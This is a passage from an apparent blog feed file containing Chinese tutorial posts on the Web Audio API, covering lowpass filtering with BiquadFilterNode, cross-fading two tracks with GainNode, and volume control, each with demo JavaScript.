document</span>.documentElement.mozRequestFullScreen();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="built_in">(document</span>.documentElement.webkitRequestFullscreen) &#123;</span><br><span class="line">     <span class="built_in"> document</span>.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">(document</span>.exitFullscreen) &#123;</span><br><span class="line">     <span class="built_in"> document</span>.exitFullscreen();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="built_in">(document</span>.msExitFullscreen) &#123;</span><br><span class="line">     <span class="built_in"> document</span>.msExitFullscreen();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="built_in">(document</span>.mozCancelFullScreen) &#123;</span><br><span class="line">     <span class="built_in"> document</span>.mozCancelFullScreen();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="built_in">(document</span>.webkitExitFullscreen) &#123;</span><br><span class="line">     <span class="built_in"> document</span>.webkitExitFullscreen();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Toggle FullScreen</span><br></pre></td></tr></table></figure><p>5. 全屏事件</p><p>看到这句代码你可能就懂了：</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).<span class="keyword">on</span>(<span class="string">&#x27;webkitfullscreenchange mozfullscreenchange fullscreenchange&#x27;</span>,fn);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当全屏状态改变时会触发上面的 fullscreenchange 事件，所以 <a href="#2885642"><span><span>#15</span> p2227</span></a> 给我提出的问题就可以得到解决了。</p><p><span>文章可能还存在错误的地方，还请多多斧正！</span></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>声音的滤波</title>
      <link href="/blog/2014/02/28/cb-webAudio-filter/"/>
      <url>/blog/2014/02/28/cb-webAudio-filter/</url>
      
        <content type="html"><![CDATA[<p>本系列文章主要是介绍 Web Audio API 的相关知识，以及 web语音通信 中会遇到的一些问题，阐述可能存在错误，还请多多斧正！</p><p>通过设备获取音频流会不可避免的渗入一些杂音，这些杂音可能来自你周边的环境，也有可能来自录音设备本身，一些低频的声音还好，人耳难以分辨出来，但是那些高频的白噪声对音质的影响是特别大的，如我们听收音机没有调到正确的频率上，会听到吱吱兹兹的刺耳的杂音。这些杂音不仅增大了音频流信号本身的体积，而且我们的耳朵也不喜欢，所以在传输之前必须对音频做相应的滤波处理。</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/webAudio-filter.html">http://www.cnblogs.com/hustskyking/p/webAudio-filter.html</a>，转载请注明源地址。</p><p><strong>P.S：请在较新版的 chrome 火狐 Firefox 中测试。</strong></p><h3>一、滤波节点</h3><h4>1. 接口介绍</h4><p>频率，是单位时间内完成振动的次数，是描述振动物体往复运动频繁程度的量。一段音频流中包含了各种频率，温和的音乐频率在一个范围之内，超过这个范围的声音一般就是噪声，人和人之间的语音交流，声音也是在一定的频段之中。</p><p>在 AudioContext 中用于滤波的节点叫做 BiquadFilterNode，Biquad 是双二阶的意思，这里涉及到了很多通信中专业词汇，我们暂时可以不用在意。BiquadFilterType 包含了各种滤波类型：</p><figure class="highlight thrift"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">BiquadFilterType</span> </span>&#123;</span><br><span class="line">    <span class="string">&quot;lowpass&quot;</span>,</span><br><span class="line">    <span class="string">&quot;highpass&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bandpass&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lowshelf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;highshelf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;peaking&quot;</span>,</span><br><span class="line">    <span class="string">&quot;notch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;allpass&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用的比较多的就是 lowpass（低通滤波），highpass（高通滤波），bandpass（带通滤波）。低通滤波就是过滤某个临界点的高频信号，只让低频信号通过，高通滤波反之。带通滤波就是允许某个频段的信号通过。这个节点的参数比较多：</p><figure class="highlight glsl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">attribute</span> BiquadFilterType type;</span><br><span class="line"><span class="keyword">readonly</span> <span class="keyword">attribute</span> AudioParam frequency; <span class="comment">// in Hertz</span></span><br><span class="line"><span class="keyword">readonly</span> <span class="keyword">attribute</span> AudioParam detune; <span class="comment">// in Cents</span></span><br><span class="line"><span class="keyword">readonly</span> <span class="keyword">attribute</span> AudioParam Q; <span class="comment">// Quality factor</span></span><br><span class="line"><span class="keyword">readonly</span> <span class="keyword">attribute</span> AudioParam gain; <span class="comment">// in Decibels</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> getFrequencyResponse(Float32Array frequencyHz,</span><br><span class="line">                          Float32Array magResponse,</span><br><span class="line">                          Float32Array phaseResponse);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中几个参数的取值范围是：</p><blockquote><p><strong>Q</strong> 默认是 1, 取值从 0.0001 到 1000.</p><p><strong>gain</strong> 默认是 0, 取值从 -40 到 40.</p></blockquote><h4>2. 初始化接口</h4><p>我们可以在初始化的时候将 BiquadFilterType 送进去：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化为低通滤波</span></span><br><span class="line"><span class="keyword">var</span> <span class="built_in">filter</span> = context.createBiquadFilter(<span class="string">&quot;lowpass&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然，我们也可以通过设置他的 AudioParam 来控制参数：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">filter</span> = context.createBiquadFilter();</span><br><span class="line"><span class="comment">// 设置为低通滤波</span></span><br><span class="line"><span class="built_in">filter</span>.type = <span class="built_in">filter</span>.LOWPASS;</span><br><span class="line"><span class="comment">// 只允许频率小于 800Hz 的音频信号通过</span></span><br><span class="line"><span class="built_in">filter</span>.frequency.value = <span class="number">800</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>两只方式都是一样的，都好控制。</p><h4>3. DEMO 测试</h4><p>简单点的话，中间只用一个 filter 节点就可以了，使用低通滤波，将频率设置为 800Hz，可以听到声音很闷，声音不是变小了，而是变闷了~节点之间的连接方式是：</p><blockquote><p>Source -&gt; Filter -&gt; Destination</p></blockquote><p>代码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> AudioContext = AudioContext || webkitAudioContext;</span><br><span class="line"><span class="keyword">var</span> context = <span class="keyword">new</span> AudioContext;</span><br><span class="line"><span class="comment">//创建节点</span></span><br><span class="line"><span class="keyword">var</span> audio = <span class="keyword">new</span> Audio(<span class="string">&quot;http://qianduannotes.duapp.com/file/SuperMario.mp3&quot;</span>);</span><br><span class="line">audio.loop = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> media = context.createMediaElementSource(audio);</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">filter</span> = context.createBiquadFilter();</span><br><span class="line"><span class="built_in">filter</span>.type=<span class="built_in">filter</span>.LOWPASS;</span><br><span class="line"><span class="built_in">filter</span>.frequency.value=<span class="number">800</span>;</span><br><span class="line"><span class="comment">//连接：media → filter → destination</span></span><br><span class="line">media.connect(<span class="built_in">filter</span>);</span><br><span class="line"><span class="built_in">filter</span>.connect(context.destination);audio.play();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为了方面查看改变频率之后波形的变化，我做了一些处理：</p><blockquote><p>Source -&gt; Filter -&gt; Analyser -&gt; Destination</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; +-----&gt; 波形绘制到 Canvas</p></blockquote><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;canvas id=<span class="string">&quot;canvas&quot;</span> width=<span class="string">&quot;400&quot;</span> height=<span class="string">&quot;300&quot;</span>&gt;&lt;/canvas&gt;&lt;br&gt;</span><br><span class="line">&lt;input <span class="keyword">type</span>=<span class="string">&quot;range&quot;</span> min=<span class="string">&quot;0&quot;</span> max=<span class="string">&quot;100&quot;</span> id=<span class="string">&quot;volume&quot;</span>&gt;</span><br><span class="line">&lt;input <span class="keyword">type</span>=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;audio.play()&quot;</span> value=<span class="string">&quot;播放&quot;</span>&gt;</span><br><span class="line">&lt;input <span class="keyword">type</span>=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;audio.pause()&quot;</span> value=<span class="string">&quot;暂停&quot;</span>&gt;</span><br><span class="line">&lt;script <span class="keyword">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">var AudioContext=AudioContext<span class="pattern-match"><span class="operator">||</span>webkit<span class="constructor">AudioContext</span>;</span></span><br><span class="line"><span class="pattern-match">var context=<span class="keyword">new</span> <span class="constructor">AudioContext</span>;</span></span><br><span class="line"><span class="pattern-match"><span class="operator">/</span><span class="operator">/</span>创建节点</span></span><br><span class="line"><span class="pattern-match">var audio = <span class="keyword">new</span> <span class="constructor">Audio(<span class="string">&quot;http://qianduannotes.duapp.com/file/SuperMario.mp3&quot;</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">audio.loop = <span class="literal">true</span>;</span></span><br><span class="line"><span class="pattern-match">var media=context.create<span class="constructor">MediaElementSource(<span class="params">audio</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">var filter=context.create<span class="constructor">BiquadFilter()</span>;</span></span><br><span class="line"><span class="pattern-match">var analyser=context.create<span class="constructor">Analyser()</span>;</span></span><br><span class="line"><span class="pattern-match"><span class="operator">/</span><span class="operator">/</span>只允许小于800的频率通过</span></span><br><span class="line"><span class="pattern-match">filter.<span class="keyword">type</span>=filter.<span class="constructor">LOWPASS</span>;</span></span><br><span class="line"><span class="pattern-match">filter.frequency.value=800;</span></span><br><span class="line"><span class="pattern-match"><span class="operator">/</span><span class="operator">/</span><span class="constructor">Canvas</span>初始化</span></span><br><span class="line"><span class="pattern-match">var width=canvas.width,height=canvas.height;</span></span><br><span class="line"><span class="pattern-match">var g=canvas.get<span class="constructor">Context(<span class="string">&quot;2d&quot;</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">g.translate(0.5,height<span class="operator">/</span>2+0.5);</span></span><br><span class="line"><span class="pattern-match"><span class="operator">/</span><span class="operator">/</span>连接：media → filter → analyser → destination</span></span><br><span class="line"><span class="pattern-match">media.connect(filter);</span></span><br><span class="line"><span class="pattern-match">filter.connect(analyser);</span></span><br><span class="line"><span class="pattern-match">analyser.connect(context.destination);</span></span><br><span class="line"><span class="pattern-match"><span class="operator">/</span><span class="operator">/</span>以fft<span class="constructor">Size</span>为长度创建一个字节数组作为数据缓冲区</span></span><br><span class="line"><span class="pattern-match">var output=<span class="keyword">new</span> <span class="constructor">Uint8Array(<span class="params">analyser</span>.<span class="params">fftSize</span>)</span>;</span></span><br><span class="line"><span class="pattern-match"><span class="operator">/</span><span class="operator">/</span>播放帧</span></span><br><span class="line"><span class="pattern-match">(<span class="keyword">function</span> callee(e)&#123;</span></span><br><span class="line"><span class="pattern-match">  analyser.get<span class="constructor">ByteTimeDomainData(<span class="params">output</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">  <span class="operator">/</span><span class="operator">/</span>将缓冲区的数据绘制到<span class="constructor">Canvas</span>上</span></span><br><span class="line"><span class="pattern-match">  g.clear<span class="constructor">Rect(-0.5,-<span class="params">height</span><span class="operator">/</span>2-0.5,<span class="params">width</span>,<span class="params">height</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">  g.<span class="keyword">begin</span><span class="constructor">Path()</span>;</span></span><br><span class="line"><span class="pattern-match">  <span class="keyword">for</span>(var i=0;i&lt;width;i<span class="operator">++</span>)</span></span><br><span class="line"><span class="pattern-match">    g.line<span class="constructor">To(<span class="params">i</span>,<span class="params">height</span><span class="operator">*</span>(<span class="params">output</span>[<span class="params">output</span>.<span class="params">length</span><span class="operator">*</span><span class="params">i</span><span class="operator">/</span><span class="params">width</span>|0]<span class="operator">/</span>256-0.5)</span>);</span></span><br><span class="line"><span class="pattern-match">  g.stroke();</span></span><br><span class="line"><span class="pattern-match">  <span class="operator">/</span><span class="operator">/</span>请求下一帧</span></span><br><span class="line"><span class="pattern-match">  request<span class="constructor">AnimationFrame(<span class="params">callee</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">&#125;)();</span></span><br><span class="line"><span class="pattern-match"><span class="operator">/</span><span class="operator">/</span>播放</span></span><br><span class="line"><span class="pattern-match">audio.play();</span></span><br><span class="line"><span class="pattern-match">load = volume.onchange = <span class="keyword">function</span>()&#123;</span></span><br><span class="line"><span class="pattern-match">    filter.frequency.value = volume.value <span class="operator">*</span> volume.value;</span></span><br><span class="line"><span class="pattern-match">&#125;</span></span><br><span class="line"><span class="pattern-match">&lt;<span class="operator">/</span>script&gt;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match"><span class="constructor">DEMO</span> <span class="constructor">Code</span></span></span><br></pre></td></tr></table></figure><p>这里频率的变化是：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">filter.frequency.value</span> = volume.value * volume.value<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>线性变化可能不太明显，所以改成了平方变化。</p><h3>二、小结</h3><p>滤波在通信中一个重要的意义是减少数据传输量，节约频带，提高传送效率，在硬件设备还未跟上语音通信的 web环境中，这个操作是十分有意义的！</p><p>本节重点是介绍 BiquadFilterNode 在 AudioContext 环境中的使用，比较简单。</p><h3>三、参考资料</h3><ul><li><a href="http://www.w3.org/TR/webaudio/" target="_blank">http://www.w3.org/TR/webaudio/</a> W3C Group</li><li><a href="http://www.web-tinker.com/" target="_blank">http://www.web-tinker.com/</a> 次碳酸钴</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> webaudio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>声道的转换</title>
      <link href="/blog/2014/02/27/cb-webAudio-cross-fading/"/>
      <url>/blog/2014/02/27/cb-webAudio-cross-fading/</url>
      
        <content type="html"><![CDATA[<p>本系列文章主要是介绍 Web Audio API 的相关知识，以及 web语音通信 中会遇到的一些问题，阐述可能存在错误，还请多多斧正！</p><p>很多粤语剧都提供了两个声道，一个左声道为粤语，一个右声道有国语。观看者可以自由切换声道，那么切换声道的原理是什么呢？在播放器中，只需要把不同的声道切换到声轨就行了，因为有左右两个声道，所以播放器至少是包含两个声轨的。如果我们想听粤语，只需要将右声道声轨的声音设置为 0，或者临时删掉右声道声轨。本文主要是利用 GainNode 节点控制音量的属性实现两个音轨之间的相互切换，Cross-fading 的意思可以在后面的 DEMO 中用耳朵体会出来~</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/webAudio-cross-fading.html">http://www.cnblogs.com/hustskyking/p/webAudio-cross-fading.html</a>，转载请注明源地址。</p><p><strong>P.S：请在较新版的 chrome 火狐 Firefox 中测试。</strong></p><h3>一、两个声音之间的声轨切换</h3><h4>1. 原理介绍</h4><p>在一个 AudioContext 中可以输入多个音频流，而这些音频流在 AudioContext 这个环境中辗转反侧，最后的出路也就是 DestinationNode：</p><blockquote><p>source 1 ---+</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |----&gt; Destination</p><p>source 2 ---+</p></blockquote><p>而要实现上面两个声轨的切换，实则是它容易了，我们可以在他们到达 Destination 之前，加一个 GainNode，<a href="http://www.cnblogs.com/hustskyking/admin/webAudio-volume">上文</a> 已经对 GainNode 做了详细的说明，本文就不继续赘述了。</p><h4>2. DEMO 演示</h4><p>首先要创建两个音频，平时我们都是使用 audio 节点带上 src 属性，插入到 DOM 中让其自动播放音频，本文将使用其他的方式拿到音频流：</p><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tank = <span class="keyword">new</span> <span class="type">Audio</span>(<span class="string">&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我准备了两个音频，一个是 tankWar.mp3 ，经典的坦克大战开场音乐，另一个是 SuperMario.mp3，超级玛丽的背景音乐，前者稍微短一些，所以在播放的时候将其设定为循环播放：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">tank.loop</span> = <span class="literal">true</span><span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后利用 createMediaElementSource 这个函数从 Media 中获取到音频流：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var source1 <span class="operator">=</span> context.createMediaElementSource(tank)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过程十分简单，整个 AudioContext 的连接模型为：</p><blockquote><p>source 1 --&gt; GainNode 1 -+</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|----&gt; Destination</p><p>source 2 --&gt; GainNode 2 -+</p></blockquote><p>然后用同一个控制棒来控制 GainNode 1 和 2。</p><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;range&quot;</span> min=<span class="string">&quot;0&quot;</span> max=<span class="string">&quot;100&quot;</span> id=<span class="string">&quot;volume&quot;</span>&gt;</span><br><span class="line">&lt;script <span class="keyword">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> tank = <span class="keyword">new</span> Audio(<span class="string">&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot;</span>);</span><br><span class="line">    tank<span class="variable">.loop</span> = true;</span><br><span class="line">    <span class="keyword">var</span> mario = <span class="keyword">new</span> Audio(<span class="string">&quot;http://qianduannotes.duapp.com/file/SuperMario.mp3&quot;</span>);</span><br><span class="line">    mario<span class="variable">.loop</span> = true;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> AudioContext = AudioContext || webkitAudioContext;</span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">context</span> = <span class="keyword">new</span> AudioContext();</span><br><span class="line">    <span class="keyword">var</span> source1 = <span class="keyword">context</span><span class="variable">.createMediaElementSource</span>(tank);</span><br><span class="line">    <span class="keyword">var</span> source2 = <span class="keyword">context</span><span class="variable">.createMediaElementSource</span>(mario);</span><br><span class="line">    <span class="keyword">var</span> gain1 = <span class="keyword">context</span><span class="variable">.createGain</span>();</span><br><span class="line">    <span class="keyword">var</span> gain2 = <span class="keyword">context</span><span class="variable">.createGain</span>();</span><br><span class="line">    <span class="comment">//连接：source → gain → destination</span></span><br><span class="line">    source1<span class="variable">.connect</span>(gain1);</span><br><span class="line">    source2<span class="variable">.connect</span>(gain2);</span><br><span class="line">    gain1<span class="variable">.connect</span>(<span class="keyword">context</span><span class="variable">.destination</span>);</span><br><span class="line">    gain2<span class="variable">.connect</span>(<span class="keyword">context</span><span class="variable">.destination</span>);</span><br><span class="line">    <span class="comment">//音量控制</span></span><br><span class="line">    <span class="keyword">var</span> value;</span><br><span class="line">    onload = volume<span class="variable">.onchange</span> = <span class="keyword">function</span>()&#123;</span><br><span class="line">      gain1<span class="variable">.gain</span><span class="variable">.value</span> = volume<span class="variable">.value</span> / <span class="number">100</span>;</span><br><span class="line">      gain2<span class="variable">.gain</span><span class="variable">.value</span> = <span class="number">1</span> - volume<span class="variable">.value</span> / <span class="number">100</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    tank<span class="variable">.onload</span> = mario<span class="variable">.onlond</span> = <span class="keyword">function</span>()&#123;</span><br><span class="line">        console<span class="variable">.log</span>(<span class="string">&quot;var1, var2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    tank<span class="variable">.play</span>();</span><br><span class="line">    mario<span class="variable">.play</span>();</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码没有封装，写的稍微有些乱，不过看了之前的说明，应该可以理解这段代码~</p><h4>3. 效果增强</h4><p>上面的音量控制，我使用的是线性控制：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">gain1.gain.value</span> = volume.value / <span class="number">100</span><span class="comment">;</span></span><br><span class="line"><span class="attr">gain2.gain.value</span> = <span class="number">1</span> - volume.value / <span class="number">100</span><span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果并不是特别好，他对音量的控制如下图：</p><p><img src="https://images.cnitblog.com/blog/387325/201402/271310073679049.png" alt=""></p><p>稍微修改下控制函数：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var</span> vol = volume.value / <span class="number">100</span>;</span><br><span class="line"><span class="attribute">gain1</span>.gain.value = Math.cos(vol * <span class="number">0</span>.<span class="number">5</span> * Math.PI);</span><br><span class="line"><span class="attribute">gain2</span>.gain.value = Math.cos((<span class="number">1</span>.<span class="number">0</span> - vol) * <span class="number">0</span>.<span class="number">5</span> * Math.PI);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以感受到音量的变化是这样的：</p><p><img src="https://images.cnitblog.com/blog/387325/201402/271310163176584.png" alt=""></p><p>详情可以戳这个demo：<a href="http://qianduannotes.duapp.com/demo/audio/" target="_blank">http://qianduannotes.duapp.com/demo/audio/</a></p><h3>二、小结</h3><p>本文的目的是介绍 Web Audio API 的 GainNode 节点的使用，并将此应用到声道的切换之中，上面的例子不能算是严格的声道切换，但如果我们只给 volume 参数设定 0 ,50, 100 这三个值，那效果跟声道的切换就差不多了~</p><p>由于这几篇文章都是关于 Node 之间的相互连接，技术含量并不多，主要是读懂 API 以及相关使用方法。行文仓促，如有错误地方，还请斧正！</p><h3>三、参考资料</h3><ul><li><a href="http://www.w3.org/TR/webaudio/" target="_blank">http://www.w3.org/TR/webaudio/</a> W3C Group</li><li><a href="http://www.web-tinker.com/" target="_blank">http://www.web-tinker.com/</a> 次碳酸钴</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> webaudio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>音量的控制</title>
      <link href="/blog/2014/02/26/cb-webAudio-volume/"/>
      <url>/blog/2014/02/26/cb-webAudio-volume/</url>
      
        <content type="html"><![CDATA[<p>改变音频的音量是音频处理中最基础的部分，我们可以利用 GainNode 来构建 Mixers 的结构块。GainNode 的接口是很简单的：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="symbol">GainNode</span> : <span class="symbol">AudioNode</span> &#123;</span><br><span class="line">    readonly attribute AudioParam gain;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过调节 GainNode.gain.value 就可以实现音频大小的调控了。下文会先介绍使用 Processor 来处理，这是一个最通用的节点，可以处理很多东西。在上文<a href="http://www.cnblogs.com/hustskyking/p/webAudio-show-audio.html" target="_blank">看得到的音频流</a>中我们也使用了该节点。</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/webAudio-volume.html">http://www.cnblogs.com/hustskyking/p/webAudio-volume.html</a>，转载请注明源地址。</p><p><strong>P.S：请在较新版的 chrome 火狐 Firefox 中测试。</strong></p><h3>一、音频流音量大小的控制</h3><h4>1. 使用 Processor 处理</h4><p>这个过程比较简单：</p><blockquote><p>source Node -&gt; Processor Node -&gt; Destination Node</p></blockquote><p>数据送入到 Processor 后，由于输入 channel 和输出的 channel 之间的对应关系需要我们自己去处理，这些对应关系可以在 onaudioprocess 事件中处理，只要上面的连接导通，那这个事件就一直会处于触发状态，无论是否有数据流送入（其实没有数据流送入也就是数据流 bufferArray 为 0 嘛）。</p><p>可以看下面这个 DEMO：</p><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">&lt;audio src=<span class="string">&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot;</span> id=<span class="string">&quot;audio&quot;</span> autoplay&gt;&lt;/audio&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;range&quot;</span> min=<span class="string">&quot;0&quot;</span> max=<span class="string">&quot;100&quot;</span> id=<span class="string">&quot;volume&quot;</span>&gt;</span><br><span class="line">&lt;script <span class="keyword">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> AudioContext = AudioContext || webkitAudioContext;</span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">context</span> = <span class="keyword">new</span> AudioContext();</span><br><span class="line">    <span class="keyword">var</span> source = <span class="keyword">context</span><span class="variable">.createMediaElementSource</span>(audio);</span><br><span class="line">    <span class="comment">// 低通滤波节点（高频信号被过滤，听到的声音会很沉闷）</span></span><br><span class="line">    <span class="keyword">var</span> processor = <span class="keyword">context</span><span class="variable">.createScriptProcessor</span>(<span class="number">1024</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// sourceNode - &gt; processor -&gt; destinationNode</span></span><br><span class="line">    source<span class="variable">.connect</span>(processor);</span><br><span class="line">    processor<span class="variable">.connect</span>(<span class="keyword">context</span><span class="variable">.destination</span>);</span><br><span class="line">    <span class="comment">//处理过程</span></span><br><span class="line">    processor<span class="variable">.onaudioprocess</span> = <span class="keyword">function</span>(e)&#123;</span><br><span class="line">      <span class="comment">//获取输入和输出的数据缓冲区</span></span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">input</span> = e<span class="variable">.inputBuffer</span><span class="variable">.getChannelData</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">output</span> = e<span class="variable">.outputBuffer</span><span class="variable">.getChannelData</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="comment">//将输入数缓冲复制到输出缓冲上，并调整音量</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span>  i =<span class="number">0</span>; i &lt; <span class="keyword">input</span><span class="variable">.length</span>; i++)</span><br><span class="line">            <span class="keyword">output</span>[i] = <span class="keyword">input</span>[i] * value;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//音量控制</span></span><br><span class="line">    <span class="keyword">var</span> value;</span><br><span class="line">    onload = volume<span class="variable">.onchange</span> = <span class="keyword">function</span>()&#123;</span><br><span class="line">      value = volume<span class="variable">.value</span> / <span class="number">200</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>2. 使用 GainNode 控制</h4><p>上面这种方式，我们可以在 onaudioprocess 事件中拿到几乎我们想要的所有数据，并且可以进行各种处理，可以说 processor 这个节点十分通用，但他的性能并不是高，你应该也看到了上面的代码中有：</p><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">//将输入数缓冲复制到输出缓冲上，并调整音量  </span><br><span class="line">for(var  i =0; i &lt; <span class="keyword">input</span>.<span class="keyword">length</span>; i++)</span><br><span class="line">    <span class="keyword">output</span>[i] = <span class="keyword">input</span>[i] <span class="comment">* value;</span>   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要将数据一一复制到输出节点，上面 demo 中我们设定的 bufferSize 是 1024 ，如果再大一些，或者文中需要处理的节点数太多，那页面将会很卡。Web Audio API 中提供了提供音量的节点，GainNode，既然提供了，毫无疑问，就用它呗~</p><p>节点连接方式也是十分的方便：</p><blockquote><p>source → gain → destination</p></blockquote><p>然后通过一个 range 控件来调节 Gain 的 gain 参数。DEMO如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot;</span> <span class="attr">id</span>=<span class="string">&quot;audio&quot;</span> <span class="attr">autoplay</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span 